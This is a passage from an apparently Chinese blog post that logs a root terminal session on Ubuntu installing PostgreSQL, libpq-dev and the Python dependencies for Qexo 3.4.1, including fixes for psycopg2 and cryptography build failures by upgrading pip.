class="hljs-string">&#x27;psql&#x27;</span> not found, but can be installed with:<br><br>apt install postgresql-client-common<br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># sudo apt install postgresql postgresql-contrib</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>The following additional packages will be installed:<br>  libpq5 postgresql-10 postgresql-client-10 postgresql-client-common postgresql-common sysstat<br>Suggested packages:<br>  postgresql-doc locales-all postgresql-doc-10 libjson-perl isag<br>The following NEW packages will be installed:<br>  libpq5 postgresql postgresql-10 postgresql-client-10 postgresql-client-common postgresql-common postgresql-contrib sysstat<br>0 upgraded, 8 newly installed, 0 to remove and 7 not upgraded.<br>Need to get 5,326 kB of archives.<br>After this operation, 20.9 MB of additional disk space will be used.<br>Do you want to <span class="hljs-built_in">continue</span>? [Y/n] y<br>Get:1 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 libpq5 amd64 10.23-0ubuntu0.18.04.2 [107 kB]<br>Get:2 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql-client-common all 190ubuntu0.1 [29.6 kB]<br>Get:3 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql-client-10 amd64 10.23-0ubuntu0.18.04.2 [943 kB]<br>Get:4 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql-common all 190ubuntu0.1 [157 kB]<br>Get:5 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql-10 amd64 10.23-0ubuntu0.18.04.2 [3,781 kB]<br>Get:6 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql all 10+190ubuntu0.1 [5,884 B]<br>Get:7 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 postgresql-contrib all 10+190ubuntu0.1 [5,896 B]<br>Get:8 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 sysstat amd64 11.6.1-1ubuntu0.2 [295 kB]<br>Fetched 5,326 kB <span class="hljs-keyword">in</span> 3s (2,006 kB/s)<br>Preconfiguring packages ...<br>Selecting previously unselected package libpq5:amd64.<br>(Reading database ... 278744 files and directories currently installed.)<br>Preparing to unpack .../0-libpq5_10.23-0ubuntu0.18.04.2_amd64.deb ...<br>Unpacking libpq5:amd64 (10.23-0ubuntu0.18.04.2) ...<br>Selecting previously unselected package postgresql-client-common.<br>Preparing to unpack .../1-postgresql-client-common_190ubuntu0.1_all.deb ...<br>Unpacking postgresql-client-common (190ubuntu0.1) ...<br>Selecting previously unselected package postgresql-client-10.<br>Preparing to unpack .../2-postgresql-client-10_10.23-0ubuntu0.18.04.2_amd64.deb ...<br>Unpacking postgresql-client-10 (10.23-0ubuntu0.18.04.2) ...<br>Selecting previously unselected package postgresql-common.<br>Preparing to unpack .../3-postgresql-common_190ubuntu0.1_all.deb ...<br>Adding <span class="hljs-string">&#x27;diversion of /usr/bin/pg_config to /usr/bin/pg_config.libpq-dev by postgresql-common&#x27;</span><br>Unpacking postgresql-common (190ubuntu0.1) ...<br>Selecting previously unselected package postgresql-10.<br>Preparing to unpack .../4-postgresql-10_10.23-0ubuntu0.18.04.2_amd64.deb ...<br>Unpacking postgresql-10 (10.23-0ubuntu0.18.04.2) ...<br>Selecting previously unselected package postgresql.<br>Preparing to unpack .../5-postgresql_10+190ubuntu0.1_all.deb ...<br>Unpacking postgresql (10+190ubuntu0.1) ...<br>Selecting previously unselected package postgresql-contrib.<br>Preparing to unpack .../6-postgresql-contrib_10+190ubuntu0.1_all.deb ...<br>Unpacking postgresql-contrib (10+190ubuntu0.1) ...<br>Selecting previously unselected package sysstat.<br>Preparing to unpack .../7-sysstat_11.6.1-1ubuntu0.2_amd64.deb ...<br>Unpacking sysstat (11.6.1-1ubuntu0.2) ...<br>Setting up sysstat (11.6.1-1ubuntu0.2) ...<br><br>Creating config file /etc/default/sysstat with new version<br>update-alternatives: using /usr/bin/sar.sysstat to provide /usr/bin/sar (sar) <span class="hljs-keyword">in</span> auto mode<br>Created symlink /etc/systemd/system/multi-user.target.wants/sysstat.service â†’ /lib/systemd/system/sysstat.service.<br>Setting up libpq5:amd64 (10.23-0ubuntu0.18.04.2) ...<br>Setting up postgresql-client-common (190ubuntu0.1) ...<br>Setting up postgresql-common (190ubuntu0.1) ...<br>Adding user postgres to group ssl-cert<br><br>Creating config file /etc/postgresql-common/createcluster.conf with new version<br>Building PostgreSQL dictionaries from installed myspell/hunspell packages...<br>  en_us<br>Removing obsolete dictionary files:<br>Created symlink /etc/systemd/system/multi-user.target.wants/postgresql.service â†’ /lib/systemd/system/postgresql.service.<br>Setting up postgresql-client-10 (10.23-0ubuntu0.18.04.2) ...<br>update-alternatives: using /usr/share/postgresql/10/man/man1/psql.1.gz to provide /usr/share/man/man1/psql.1.gz (psql.1.gz) <span class="hljs-keyword">in</span> auto mode<br>Setting up postgresql-10 (10.23-0ubuntu0.18.04.2) ...<br>Creating new PostgreSQL cluster 10/main ...<br>/usr/lib/postgresql/10/bin/initdb -D /var/lib/postgresql/10/main --auth-local peer --auth-host md5<br>The files belonging to this database system will be owned by user <span class="hljs-string">&quot;postgres&quot;</span>.<br>This user must also own the server process.<br><br>The database cluster will be initialized with locale <span class="hljs-string">&quot;en_US.UTF-8&quot;</span>.<br>The default database encoding has accordingly been <span class="hljs-built_in">set</span> to <span class="hljs-string">&quot;UTF8&quot;</span>.<br>The default text search configuration will be <span class="hljs-built_in">set</span> to <span class="hljs-string">&quot;english&quot;</span>.<br><br>Data page checksums are disabled.<br><br>fixing permissions on existing directory /var/lib/postgresql/10/main ... ok<br>creating subdirectories ... ok<br>selecting default max_connections ... 100<br>selecting default shared_buffers ... 128MB<br>selecting default timezone ... Asia/Shanghai<br>selecting dynamic shared memory implementation ... posix<br>creating configuration files ... ok<br>running bootstrap script ... ok<br>performing post-bootstrap initialization ... ok<br>syncing data to disk ... ok<br><br>Success. You can now start the database server using:<br><br>    /usr/lib/postgresql/10/bin/pg_ctl -D /var/lib/postgresql/10/main -l logfile start<br><br>Ver Cluster Port Status Owner    Data directory              Log file<br>10  main    5432 down   postgres /var/lib/postgresql/10/main /var/log/postgresql/postgresql-10-main.log<br>update-alternatives: using /usr/share/postgresql/10/man/man1/postmaster.1.gz to provide /usr/share/man/man1/postmaster.1.gz (postmaster.1.gz) <span class="hljs-keyword">in</span> auto mode<br>Setting up postgresql (10+190ubuntu0.1) ...<br>Setting up postgresql-contrib (10+190ubuntu0.1) ...<br>Processing triggers <span class="hljs-keyword">for</span> systemd (237-3ubuntu10.57) ...<br>Processing triggers <span class="hljs-keyword">for</span> man-db (2.8.3-2ubuntu0.1) ...<br>Processing triggers <span class="hljs-keyword">for</span> ureadahead (0.100.0-21) ...<br>Processing triggers <span class="hljs-keyword">for</span> libc-bin (2.27-3ubuntu1.6) ...<br><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># sudo systemctl status postgresql</span><br>â— postgresql.service - PostgreSQL RDBMS<br>   Loaded: loaded (/lib/systemd/system/postgresql.service; enabled; vendor preset: enabled)<br>   Active: active (exited) since Sat 2024-11-02 10:39:10 CST; 43s ago<br> Main PID: 19119 (code=exited, status=0/SUCCESS)<br>    Tasks: 0 (<span class="hljs-built_in">limit</span>: 4628)<br>   CGroup: /system.slice/postgresql.service<br><br>Nov 02 10:39:10 ningan systemd[1]: Starting PostgreSQL RDBMS...<br>Nov 02 10:39:10 ningan systemd[1]: Started PostgreSQL RDBMS.<br><br><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># psql --version</span><br>psql (PostgreSQL) 10.23 (Ubuntu 10.23-0ubuntu0.18.04.2)<br></code></pre></td></tr></table></figure><h3 id="å›åˆ°ä¸»çº¿-2"><a href="#å›åˆ°ä¸»çº¿-2" class="headerlink" title="å›åˆ°ä¸»çº¿"></a>å›åˆ°ä¸»çº¿</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Using cached https://files.pythonhosted.org/packages/30/8e/cc23c762c5dcd1d367d73cf006a326e0df2bd0e785cba18b658b39904c1e/Django-3.2.25-py3-none-any.whl<br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Using cached https://files.pythonhosted.org/packages/4f/52/a115fe175028b058df353c5a3d5290b71514a83f67078a6482cff24d6137/PyMySQL-1.0.2-py3-none-any.whl<br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Using cached https://files.pythonhosted.org/packages/15/1e/cbec55e05c0577429945d785cce8e16eebf2a8bd9c5ccda2b9c6e2a51ab4/boto3-1.34.44-py3-none-any.whl<br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Using cached https://files.pythonhosted.org/packages/70/8e/0e2d847013cb52cd35b38c009bb167a1a26b2ce6cd6965bf26b47bc0bf44/requests-2.31.0-py3-none-any.whl<br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Using cached https://files.pythonhosted.org/packages/37/56/6e038f8cd6b76984005cd5cf90926caa6898b4220984a32dbbdc044a3f18/PyGithub-2.2.0-py3-none-any.whl<br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Using cached https://files.pythonhosted.org/packages/70/f3/82ec52f96bbcccd10a6ce8f145115d08463c54a374f31beb278aa16d8b25/python_gitlab-4.4.0-py3-none-any.whl<br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Using cached https://files.pythonhosted.org/packages/ae/88/14655f727f66b3e3199f4467bafcc88283e6c31b562686bf606264e09181/html2text-2020.1.16-py3-none-any.whl<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Using cached https://files.pythonhosted.org/packages/cd/e5/af35f7ea75cf72f2cd079c95ee16797de7cd71f29ea7c68ae5ce7be1eda0/PyYAML-6.0.1.tar.gz<br>Collecting urllib3==1.26.18 (from -r requirements.txt (line 9))<br>  Using cached https://files.pythonhosted.org/packages/b0/53/aa91e163dcfd1e5b82d8a890ecf13314e3e149c05270cc644581f77f17fd/urllib3-1.26.18-py2.py3-none-any.whl<br>Collecting Markdown==3.5.2 (from -r requirements.txt (line 10))<br>  Using cached https://files.pythonhosted.org/packages/42/f4/f0031854de10a0bc7821ef9fca0b92ca0d7aa6fbfbf504c5473ba825e49c/Markdown-3.5.2-py3-none-any.whl<br>Collecting djongo5==1.3.9 (from -r requirements.txt (line 11))<br>  Using cached https://files.pythonhosted.org/packages/1d/42/f3aaa938638cdf5c17a766950029bdb0a370580255a58cf2fb27fe487c66/djongo5-1.3.9-py3-none-any.whl<br>Collecting django-cors-headers==4.1.0 (from -r requirements.txt (line 12))<br>  Using cached https://files.pythonhosted.org/packages/a0/2c/7df4f05a02b20b2c22ffc137b5a04f93214bbaf202fd2a29637ac694e0e4/django_cors_headers-4.1.0-py3-none-any.whl<br>Collecting pymongo==3.13.0 (from -r requirements.txt (line 13))<br>  Using cached https://files.pythonhosted.org/packages/0b/9c/e1652def3cc841688402fcfa676eb14bd5551cb29c7e1b6f65488d89b30b/pymongo-3.13.0-cp38-cp38-manylinux1_x86_64.whl<br>Collecting dnspython==2.2.1 (from -r requirements.txt (line 14))<br>  Using cached https://files.pythonhosted.org/packages/9b/ed/28fb14146c7033ba0e89decd92a4fa16b0b69b84471e2deab3cc4337cc35/dnspython-2.2.1-py3-none-any.whl<br>Collecting sqlparse==0.2.4 (from -r requirements.txt (line 15))<br>  Using cached https://files.pythonhosted.org/packages/65/85/20bdd72f4537cf2c4d5d005368d502b2f464ede22982e724a82c86268eda/sqlparse-0.2.4-py2.py3-none-any.whl<br>Collecting psycopg2-binary==2.9.9 (from -r requirements.txt (line 16))<br>  Using cached https://files.pythonhosted.org/packages/fc/07/e720e53bfab016ebcc34241695ccc06a9e3d91ba19b40ca81317afbdc440/psycopg2-binary-2.9.9.tar.gz<br>    Complete output from <span class="hljs-built_in">command</span> python setup.py egg_info:<br>    running egg_info<br>    creating pip-egg-info/psycopg2_binary.egg-info<br>    writing pip-egg-info/psycopg2_binary.egg-info/PKG-INFO<br>    writing dependency_links to pip-egg-info/psycopg2_binary.egg-info/dependency_links.txt<br>    writing top-level names to pip-egg-info/psycopg2_binary.egg-info/top_level.txt<br>    writing manifest file <span class="hljs-string">&#x27;pip-egg-info/psycopg2_binary.egg-info/SOURCES.txt&#x27;</span><br>    Error: pg_config --libdir failed: You need to install postgresql-server-dev-X.Y <span class="hljs-keyword">for</span> building a server-side extension or libpq-dev <span class="hljs-keyword">for</span> building a client-side application.<br>    <br>    <br>    ----------------------------------------<br>Command <span class="hljs-string">&quot;python setup.py egg_info&quot;</span> failed with error code 1 <span class="hljs-keyword">in</span> /tmp/pip-build-gwmtudh3/psycopg2-binary/<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br><br></code></pre></td></tr></table></figure><h3 id="å°æ’æ›²ï¼šå®‰è£…postgresqlå¼€å‘åŒ…"><a href="#å°æ’æ›²ï¼šå®‰è£…postgresqlå¼€å‘åŒ…" class="headerlink" title="å°æ’æ›²ï¼šå®‰è£…postgresqlå¼€å‘åŒ…"></a>å°æ’æ›²ï¼šå®‰è£…postgresqlå¼€å‘åŒ…</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># psql --version</span><br>psql (PostgreSQL) 10.23 (Ubuntu 10.23-0ubuntu0.18.04.2)<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># apt install postgresql-server-dev-X.Y</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>E: Unable to locate package postgresql-server-dev-X.Y<br>E: Couldn<span class="hljs-string">&#x27;t find any package by glob &#x27;</span>postgresql-server-dev-X.Y<span class="hljs-string">&#x27;</span><br><span class="hljs-string">E: Couldn&#x27;</span>t find any package by regex <span class="hljs-string">&#x27;postgresql-server-dev-X.Y&#x27;</span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># apt install postgresql-server-dev-10.23</span><br>Reading package lists... Done<br>Building dependency tree       <br>Reading state information... Done<br>E: Unable to locate package postgresql-server-dev-10.23<br>E: Couldn<span class="hljs-string">&#x27;t find any package by glob &#x27;</span>postgresql-server-dev-10.23<span class="hljs-string">&#x27;</span><br><span class="hljs-string">E: Couldn&#x27;</span>t find any package by regex <span class="hljs-string">&#x27;postgresql-server-dev-10.23&#x27;</span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># apt  install libpq-dev</span><br>Reading package lists... Done<br>Building dependency tree... 50%<br>Building dependency tree       <br>Reading state information... Done<br>Suggested packages:<br>  postgresql-doc-10<br>The following NEW packages will be installed:<br>  libpq-dev<br>0 upgraded, 1 newly installed, 0 to remove and 7 not upgraded.<br>Need to get 219 kB of archives.<br>After this operation, 1,101 kB of additional disk space will be used.<br>Get:1 https://mirrors.aliyun.com/ubuntu bionic-security/main amd64 libpq-dev amd64 10.23-0ubuntu0.18.04.2 [219 kB]<br>Fetched 219 kB <span class="hljs-keyword">in</span> 1s (415 kB/s)   <br>Selecting previously unselected package libpq-dev.<br>(Reading database ... 279540 files and directories currently installed.)<br>Preparing to unpack .../libpq-dev_10.23-0ubuntu0.18.04.2_amd64.deb ...<br>Unpacking libpq-dev (10.23-0ubuntu0.18.04.2) ...<br>Setting up libpq-dev (10.23-0ubuntu0.18.04.2) ...<br>Processing triggers <span class="hljs-keyword">for</span> man-db (2.8.3-2ubuntu0.1) ...<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br><br><br></code></pre></td></tr></table></figure><h3 id="å›åˆ°ä¸»çº¿-3"><a href="#å›åˆ°ä¸»çº¿-3" class="headerlink" title="å›åˆ°ä¸»çº¿"></a>å›åˆ°ä¸»çº¿</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Using cached https://files.pythonhosted.org/packages/30/8e/cc23c762c5dcd1d367d73cf006a326e0df2bd0e785cba18b658b39904c1e/Django-3.2.25-py3-none-any.whl<br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Using cached https://files.pythonhosted.org/packages/4f/52/a115fe175028b058df353c5a3d5290b71514a83f67078a6482cff24d6137/PyMySQL-1.0.2-py3-none-any.whl<br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Using cached https://files.pythonhosted.org/packages/15/1e/cbec55e05c0577429945d785cce8e16eebf2a8bd9c5ccda2b9c6e2a51ab4/boto3-1.34.44-py3-none-any.whl<br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Using cached https://files.pythonhosted.org/packages/70/8e/0e2d847013cb52cd35b38c009bb167a1a26b2ce6cd6965bf26b47bc0bf44/requests-2.31.0-py3-none-any.whl<br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Using cached https://files.pythonhosted.org/packages/37/56/6e038f8cd6b76984005cd5cf90926caa6898b4220984a32dbbdc044a3f18/PyGithub-2.2.0-py3-none-any.whl<br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Using cached https://files.pythonhosted.org/packages/70/f3/82ec52f96bbcccd10a6ce8f145115d08463c54a374f31beb278aa16d8b25/python_gitlab-4.4.0-py3-none-any.whl<br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Using cached https://files.pythonhosted.org/packages/ae/88/14655f727f66b3e3199f4467bafcc88283e6c31b562686bf606264e09181/html2text-2020.1.16-py3-none-any.whl<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Using cached https://files.pythonhosted.org/packages/cd/e5/af35f7ea75cf72f2cd079c95ee16797de7cd71f29ea7c68ae5ce7be1eda0/PyYAML-6.0.1.tar.gz<br>Collecting urllib3==1.26.18 (from -r requirements.txt (line 9))<br>  Using cached https://files.pythonhosted.org/packages/b0/53/aa91e163dcfd1e5b82d8a890ecf13314e3e149c05270cc644581f77f17fd/urllib3-1.26.18-py2.py3-none-any.whl<br>Collecting Markdown==3.5.2 (from -r requirements.txt (line 10))<br>  Using cached https://files.pythonhosted.org/packages/42/f4/f0031854de10a0bc7821ef9fca0b92ca0d7aa6fbfbf504c5473ba825e49c/Markdown-3.5.2-py3-none-any.whl<br>Collecting djongo5==1.3.9 (from -r requirements.txt (line 11))<br>  Using cached https://files.pythonhosted.org/packages/1d/42/f3aaa938638cdf5c17a766950029bdb0a370580255a58cf2fb27fe487c66/djongo5-1.3.9-py3-none-any.whl<br>Collecting django-cors-headers==4.1.0 (from -r requirements.txt (line 12))<br>  Using cached https://files.pythonhosted.org/packages/a0/2c/7df4f05a02b20b2c22ffc137b5a04f93214bbaf202fd2a29637ac694e0e4/django_cors_headers-4.1.0-py3-none-any.whl<br>Collecting pymongo==3.13.0 (from -r requirements.txt (line 13))<br>  Using cached https://files.pythonhosted.org/packages/0b/9c/e1652def3cc841688402fcfa676eb14bd5551cb29c7e1b6f65488d89b30b/pymongo-3.13.0-cp38-cp38-manylinux1_x86_64.whl<br>Collecting dnspython==2.2.1 (from -r requirements.txt (line 14))<br>  Using cached https://files.pythonhosted.org/packages/9b/ed/28fb14146c7033ba0e89decd92a4fa16b0b69b84471e2deab3cc4337cc35/dnspython-2.2.1-py3-none-any.whl<br>Collecting sqlparse==0.2.4 (from -r requirements.txt (line 15))<br>  Using cached https://files.pythonhosted.org/packages/65/85/20bdd72f4537cf2c4d5d005368d502b2f464ede22982e724a82c86268eda/sqlparse-0.2.4-py2.py3-none-any.whl<br>Collecting psycopg2-binary==2.9.9 (from -r requirements.txt (line 16))<br>  Using cached https://files.pythonhosted.org/packages/fc/07/e720e53bfab016ebcc34241695ccc06a9e3d91ba19b40ca81317afbdc440/psycopg2-binary-2.9.9.tar.gz<br>Collecting cryptography==42.0.4 (from -r requirements.txt (line 17))<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/81/d8/214d25515bf6034dce99aba22eeb47443b14c82160114e3d3f33067c6d3b/cryptography-42.0.4.tar.gz (670kB)<br>    100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 675kB 1.3MB/s <br>    Complete output from <span class="hljs-built_in">command</span> python setup.py egg_info:<br>    Traceback (most recent call last):<br>      File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 1, <span class="hljs-keyword">in</span> &lt;module&gt;<br>      File <span class="hljs-string">&quot;/usr/lib/python3.8/tokenize.py&quot;</span>, line 392, <span class="hljs-keyword">in</span> open<br>        buffer = _builtin_open(filename, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>    FileNotFoundError: [Errno 2] No such file or directory: <span class="hljs-string">&#x27;/tmp/pip-build-xdpazwvh/cryptography/setup.py&#x27;</span><br>    <br>    ----------------------------------------<br>Command <span class="hljs-string">&quot;python setup.py egg_info&quot;</span> failed with error code 1 <span class="hljs-keyword">in</span> /tmp/pip-build-xdpazwvh/cryptography/<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="å°æ’æ›²ï¼šå‡çº§pip"><a href="#å°æ’æ›²ï¼šå‡çº§pip" class="headerlink" title="å°æ’æ›²ï¼šå‡çº§pip"></a>å°æ’æ›²ï¼šå‡çº§pip</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install cryptography==42.0.4</span><br>Collecting cryptography==42.0.4<br>  Using cached https://files.pythonhosted.org/packages/81/d8/214d25515bf6034dce99aba22eeb47443b14c82160114e3d3f33067c6d3b/cryptography-42.0.4.tar.gz<br>    Complete output from <span class="hljs-built_in">command</span> python setup.py egg_info:<br>    Traceback (most recent call last):<br>      File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 1, <span class="hljs-keyword">in</span> &lt;module&gt;<br>      File <span class="hljs-string">&quot;/usr/lib/python3.8/tokenize.py&quot;</span>, line 392, <span class="hljs-keyword">in</span> open<br>        buffer = _builtin_open(filename, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>    FileNotFoundError: [Errno 2] No such file or directory: <span class="hljs-string">&#x27;/tmp/pip-build-4r5u7y_l/cryptography/setup.py&#x27;</span><br>    <br>    ----------------------------------------<br>Command <span class="hljs-string">&quot;python setup.py egg_info&quot;</span> failed with error code 1 <span class="hljs-keyword">in</span> /tmp/pip-build-4r5u7y_l/cryptography/<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install --upgrade pip</span><br>Cache entry deserialization failed, entry ignored<br>Collecting pip<br>  Downloading https://files.pythonhosted.org/packages/ef/7d/500c9ad20238fcfcb4cb9243eede163594d7020ce87bd9610c9e02771876/pip-24.3.1-py3-none-any.whl (1.8MB)<br>    100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1.8MB 613kB/s <br>Installing collected packages: pip<br>  Found existing installation: pip 9.0.1<br>    Not uninstalling pip at /usr/lib/python3/dist-packages, outside environment /usr<br>Successfully installed pip-24.3.1<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install cryptography==42.0.4</span><br>Collecting cryptography==42.0.4<br>  Downloading cryptography-42.0.4-cp37-abi3-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (5.3 kB)<br>Collecting cffi&gt;=1.12 (from cryptography==42.0.4)<br>  Downloading cffi-1.17.1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (1.5 kB)<br>Collecting pycparser (from cffi&gt;=1.12-&gt;cryptography==42.0.4)<br>  Downloading pycparser-2.22-py3-none-any.whl.metadata (943 bytes)<br>Downloading 